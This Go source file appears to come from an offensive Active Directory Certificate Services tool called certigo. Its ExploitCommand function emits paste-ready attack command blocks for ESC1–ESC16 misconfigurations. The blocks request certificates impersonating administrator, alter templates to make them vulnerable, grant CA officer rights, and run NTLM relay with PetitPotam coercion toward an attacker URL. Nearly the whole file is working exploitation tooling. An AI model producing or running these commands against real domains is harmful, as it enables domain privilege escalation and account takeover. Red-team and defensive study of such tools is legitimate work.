package esc

import (
	"fmt"
	"strings"

	"github.com/ajm4n/certigo/internal/adcs"
)

// ExploitContext carries the runtime values (creds, DC, method) so
// ExploitCommand can emit a copy-paste-ready certigo invocation rather
// than placeholder hints. Zero values fall back to <angle-bracket>
// placeholders for fields the operator must fill in.
type ExploitContext struct {
	Username  string
	Password  string
	Hashes    string // LMHASH:NTHASH form for --hashes
	Domain    string
	DCHost    string
	Method    string // req submit method ("dcom" default)
	Insecure  bool   // --insecure-tls on req / auth
	TargetUPN string // defaults to administrator@<domain>
}

// ExploitCommand returns a paste-ready multi-line command block that
// exploits finding f on template tpl (published by ca). When ctx is nil
// the returned string falls back to ExploitHint's placeholder variant.
func ExploitCommand(f adcs.Finding, tpl *adcs.Template, ca *adcs.CertificateAuthority, ctx *ExploitContext) string {
	if ctx == nil {
		return ExploitHint(f, tpl, ca)
	}

	tplName := tplCN(tpl)
	caName := "<ca-name>"
	caHost := "<ca-host>"
	if ca != nil {
		if ca.Name != "" {
			caName = ca.Name
		}
		if ca.DNSName != "" {
			caHost = ca.DNSName
		}
	}

	authFlags := authFlagStr(ctx)
	target := ctx.TargetUPN
	if target == "" && ctx.Domain != "" {
		target = "administrator@" + strings.ToLower(ctx.Domain)
	}
	if target == "" {
		target = "administrator@<domain>"
	}
	outFile := sanitizeFilename(strings.TrimSuffix(target, "@"+ctx.Domain)) + ".pfx"
	if outFile == ".pfx" {
		outFile = "victim.pfx"
	}

	method := ctx.Method
	if method == "" {
		method = "dcom"
	}
	methodFlag := ""
	if method != "dcom" {
		methodFlag = fmt.Sprintf(" --method %s", method)
	}
	insecure := ""
	if ctx.Insecure || method == "web" {
		insecure = " --insecure-tls"
	}

	switch f.ESC {

	case "ESC1", "ESC9", "ESC10", "ESC14", "ESC15":
		// Enrollee-supplies-subject family: request cert with target UPN in SAN,
		// then authenticate.
		return fmt.Sprintf(
			"certigo req%s%s \\\n"+
				"    --ca %s --ca-name %s \\\n"+
				"    --template '%s' \\\n"+
				"    %s \\\n"+
				"    --upn %s --out %s\n"+
				"certigo auth -u %s -d %s --dc-host %s \\\n"+
				"    --pfx %s --out-ccache victim.ccache\n"+
				"export KRB5CCNAME=$PWD/victim.ccache",
			methodFlag, insecure,
			caHost, caName,
			tplName,
			authFlags,
			target, outFile,
			strings.Split(target, "@")[0], ctx.Domain, ctx.DCHost,
			outFile,
		)

	case "ESC2":
		return fmt.Sprintf(
			"# Any-Purpose EKU. Request the cert, then sign arbitrary subjects.\n"+
				"certigo req%s%s \\\n"+
				"    --ca %s --ca-name %s --template '%s' \\\n"+
				"    %s --out loot.pfx",
			methodFlag, insecure, caHost, caName, tplName, authFlags)

	case "ESC3":
		return fmt.Sprintf(
			"# Enrollment Agent cert, then enrol-on-behalf-of the target.\n"+
				"certigo req%s%s \\\n"+
				"    --ca %s --ca-name %s --template '%s' \\\n"+
				"    %s --out agent.pfx\n"+
				"# Then use the agent cert to enroll for <target>:\n"+
				"certipy req -ca %s -template User -pfx agent.pfx -on-behalf-of '%s\\%s'",
			methodFlag, insecure, caHost, caName, tplName, authFlags,
			caHost, strings.ToUpper(ctx.Domain), strings.Split(target, "@")[0])

	case "ESC4":
		return fmt.Sprintf(
			"# ESC4: backup + make template ESC1-vulnerable, then exploit like ESC1.\n"+
				"certigo template %s \\\n"+
				"    -d %s --dc-host %s \\\n"+
				"    --name %s --action make-vulnerable --file %s.backup.json\n"+
				"# then the ESC1 flow against the same --template %s",
			authFlags, ctx.Domain, ctx.DCHost, tplName, tplName, tplName)

	case "ESC6":
		return fmt.Sprintf(
			"# ESC6: CA sets EDITF_ATTRIBUTESUBJECTALTNAME2 - any template takes SAN.\n"+
				"certigo req%s%s \\\n"+
				"    --ca %s --ca-name %s --template User \\\n"+
				"    %s --upn %s --out %s",
			methodFlag, insecure, caHost, caName, authFlags, target, outFile)

	case "ESC7":
		return fmt.Sprintf(
			"# ESC7: you hold Manage-CA. Toggle officer rights, approve pending requests.\n"+
				"certigo ca --ca-name %s %s \\\n"+
				"    -d %s --dc-host %s --list-officers\n"+
				"certigo ca --ca-name %s %s \\\n"+
				"    -d %s --dc-host %s --add-officer <your-sid>\n"+
				"certigo ca --ca-name %s %s \\\n"+
				"    -d %s --dc-host %s --issue-request <pending-request-id>",
			caName, authFlags, ctx.Domain, ctx.DCHost,
			caName, authFlags, ctx.Domain, ctx.DCHost,
			caName, authFlags, ctx.Domain, ctx.DCHost)

	case "ESC8":
		return fmt.Sprintf(
			"# ESC8: HTTP(S) web enrollment + NTLM relay.\n"+
				"certigo relay --listen :80 --target http://%s/certsrv/ \\\n"+
				"    --trigger petitpotam --target-host <victim> \\\n"+
				"    --attacker-url http://<attacker>/ --out-dir loot",
			caHost)

	case "ESC11":
		return fmt.Sprintf(
			"# ESC11: CA accepts unencrypted ICPR requests - relay to RPC.\n"+
				"certigo relay --listen :80 --target rpc://%s \\\n"+
				"    --trigger petitpotam --target-host <victim> \\\n"+
				"    --attacker-url http://<attacker>/ --out-dir loot",
			caHost)

	case "ESC13", "ESC16":
		return fmt.Sprintf(
			"# %s: template issuance/application policy maps to a privileged group.\n"+
				"certigo req%s%s \\\n"+
				"    --ca %s --ca-name %s --template '%s' \\\n"+
				"    %s --out escalated.pfx",
			f.ESC, methodFlag, insecure, caHost, caName, tplName, authFlags)
	}
	return ""
}

func tplCN(tpl *adcs.Template) string {
	if tpl == nil {
		return "<template>"
	}
	if tpl.Name != "" {
		return tpl.Name
	}
	return tpl.DisplayName
}

// authFlagStr returns the -u/-p/--hashes flag fragment for a certigo
// subcommand given the ExploitContext. Hashes win over password when both
// are set (hash-based auth bypasses interactive prompting).
func authFlagStr(ctx *ExploitContext) string {
	user := ctx.Username
	if user == "" {
		user = "<user>"
	}
	if ctx.Hashes != "" {
		return fmt.Sprintf("-u '%s' --hashes '%s'", user, ctx.Hashes)
	}
	pw := ctx.Password
	if pw == "" {
		pw = "<password>"
	}
	return fmt.Sprintf("-u '%s' -p '%s'", user, pw)
}

// sanitizeFilename trims characters that don't belong in a pfx filename.
func sanitizeFilename(s string) string {
	s = strings.TrimSpace(s)
	var b strings.Builder
	for _, r := range s {
		switch {
		case r >= 'a' && r <= 'z',
			r >= 'A' && r <= 'Z',
			r >= '0' && r <= '9',
			r == '-' || r == '_' || r == '.':
			b.WriteRune(r)
		}
	}
	return b.String()
}
